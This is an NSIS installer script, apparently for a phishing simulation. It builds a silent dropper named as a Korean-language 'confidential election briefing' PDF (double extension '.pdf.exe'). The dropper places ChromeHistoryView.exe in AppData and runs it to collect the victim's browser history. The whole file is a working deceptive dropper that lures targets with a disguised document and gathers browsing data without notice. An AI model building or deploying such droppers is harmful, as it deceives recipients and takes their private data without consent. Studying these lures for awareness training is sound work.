SetCompressor /SOLID LZMA
Name 'Simulation Malware'
OutFile '[기밀]4∙15 총선 브리핑 문건.pdf.exe'
;SilentInstall silent
SilentInstall silent

##아이콘 이름 설정
Icon 'test.ico'

Section "section_name"

    SetOutPath "C:\Users\Default\AppData"
        File 'ChromeHistoryView.exe'

    Sleep 3000

    Exec "C:\Users\Default\AppData\ChromeHistoryView.exe" "exec ChromeHistoryView"
SectionEnd
